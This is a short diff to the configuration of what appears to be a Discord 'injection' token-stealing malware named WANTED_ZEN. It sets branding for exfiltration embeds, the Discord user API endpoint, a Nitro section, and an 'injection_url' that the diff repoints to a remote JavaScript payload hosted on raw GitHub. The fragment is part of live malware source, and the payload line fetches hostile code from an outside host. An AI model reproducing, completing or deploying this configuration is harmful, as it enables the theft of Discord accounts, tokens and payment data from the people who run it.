@@ -14,7 +14,7 @@ const config = {
   embed_name: 'WANTED_ZEN Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1280105667092545558/1315932794748407910/177a18fa9b4635d8.png?ex=6759356b&is=6757e3eb&hm=6a12659f3589355a32f86bf7da96d1449ad6d57424b5210ad5619dfe18e59dcb&'.replace(/ /g, '%20'),
   embed_color: 15548997, 
-  injection_url: 'https://raw.githubusercontent.com/u8i9vnyhngvjyfvyjf6uy/8573535358359673/main/34834897345358977356.js', 
+  injection_url: 'https://raw.githubusercontent.com/u8i9vnyhngvjyfvyjf6uy/WANTED_ZEN/refs/heads/main/WANTED_ZEN.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
